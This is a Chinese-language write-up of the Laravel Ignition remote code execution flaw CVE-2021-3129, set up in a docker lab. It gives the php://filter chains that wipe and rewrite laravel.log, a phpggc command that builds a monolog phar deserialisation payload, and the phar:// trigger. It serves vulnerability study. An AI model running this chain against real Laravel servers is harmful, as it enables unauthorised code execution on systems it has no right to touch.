# 0x00 前言

大佬博客说 **CVE-2021-3129** 漏洞很像 **hitcon2018的One Line PHP Challenge** ，于是去看了看

    
    
    <?php
    ($_=@$GET['orange']) && @substr(file($_)[0],0,6) ==='@<?php' ?include($_):highlight_file(__FILE__);
    ?>
    

通过Get传入orange参数作为文件名，系统将该文件的前6个字符与@<?php比较，若匹配则包含这个文件。

> ## php中的session.upload_progress

文件上传时应用可以发送一个 **POST请求** 到终端（例如通过XHR）来检查这个状态

如下：

![img](https://image.3001.net/images/20210421/1619010830_6080250e7de62314aadce.png!small)

简而言之，我们可以在上传文件时POST一个可控参数来达到远程命令执行的目的

    
    
    <!DOCTYPE html>
    <html> 
        <body>
            <form action="http://e113b1bc-28b8-4f08-9e60-b74fe3a96ef3.chall.ctf.show/" method="POST" enctype="multipart/form-data">    
            <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />    
            <input type="file" name="file" />    
            <input type="submit" value="submit" /> </form>
        </body>
    </html>
    

> php.ini的默认选项

![](https://image.3001.net/images/20210421/1619010830_6080250ebe07659a4ddd0.png!small)

`enabled=on`表示`upload_progress`功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中
；

`cleanup=on`表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；

`name`当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；

`prefix+name`将表示为session中的键名

> ## base64编码

这里主要是介绍filter伪协议的`convert.base64-decode`

会将非base64字符给 **过滤** 掉后再进行`decode`，但是如果`=`后面出现了别的base64字符，则会出现报错

> ## interfece implements
    
    
    <?php
    interface` `Cinema
    {
     ``const` `film = ``'加勒比海盗'``;
     ``public` `function` `show();
    }
    class` `Order ``implements` `Cinema
    {
     ``public` `function` `show()
     ``{
      ``echo` `"影院 接口开放了<br>"``;
     ``}
    }
    $face` `= ``new` `Order();
    echo` `$face``->show();  
    echo` `Cinema::film;
    

个人理解：interface类似于python的装饰器，implements就是@。

# 0x01 环境搭建

    
    
    git clone https://github.com.cnpmjs.org/SNCKER/CVE-2021-3129.git
    cd CVE-2021-3129
    docker-compose up -d
    

# 0x02 漏洞分析

## 主要步骤：

  1. 清空log
  2. 写入phar
  3. 读取phar

## 主要思路：

通过对Laravel的debug页面进行抓包，再对比源码  
![3](https://image.3001.net/images/20210421/1619010835_608025132aa77c14c3e56.png!small)

我们发现ViewFile以及variableName参数是可控的，源码如下

    
    
    class MakeViewVariableOptionalSolution implements RunnableSolution
    {
        ...
    
        public function run(array $parameters = [])
        {
            $output = $this->makeOptional($parameters);
            if ($output !== false) {
                file_put_contents($parameters['viewFile'], $output);
            }
        }
    
        public function makeOptional(array $parameters = [])
        {
            $originalContents = file_get_contents($parameters['viewFile']); // [1]
            $newContents = str_replace('

分析下来，发现viewFile参数利用了php的"危险函数"

    
    
    $contents = file_get_contents($parameters['viewFile']);
    file_put_contents($parameters['viewFile'], $contents);

进一步分析，发现我们可以通过此页面往Laravel的log文件写入数据。那么我们可以结合上述函数，对laravel的log文件进行注入，达到远程执行命令的目的。

我们首先清空log，然后写入phar的POP链，再清空多余的字符，这样就把log文件完全变成了phar规范的代码，所以可以利用phar协议，反序列化执行代码，达到RCE。难点在于清空log以及POP构造

##

## 1.清空log

    
    
    php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log

通过多次编码，将log文件内的字符转换为非base64字符，然后再base64_decode

写入AA，对齐

    
    
    viewFile: AA

## 2.写入phar

log文件的格式：

    
    
    [时间] [某些字符] PAYLOAD [某些字符] PAYLOAD [某些字符] 部分PAYLOAD [某些字符]

PAYLOAD会在log中出现两次，我们可以通过编码去掉其中一个以及其他无关的字符。记得在payload后添加一个字符

![img](https://image.3001.net/images/20210421/1619010838_60802516639e6b1176402.png!small)

payload的生成

一般使用phpggc

    
    
    php -d 'phar.readonly=0' phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())"

小问题：在`file_get_contents()`传入`\00`的时候php会报Warning，导致phar无法写入。那么可以替代\00使用=00（python编码），使用`convert.quoted-printable-encode`过滤器将所有字符转为=+ascii码，再解码出来。

 **清除多余字符**

    
    
    php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=test.txt

## 3.读取phar

    
    
    phar://../storage/logs/laravel.log/test.txt

##

参考

> [1]https://www.ambionics.io/blog/laravel-debug-rce  
> [2]https://yyz9.cn/2021/04/07/laravel-debug%e9%a1%b5%e9%9d%a2rce-> cve-2021-3129/

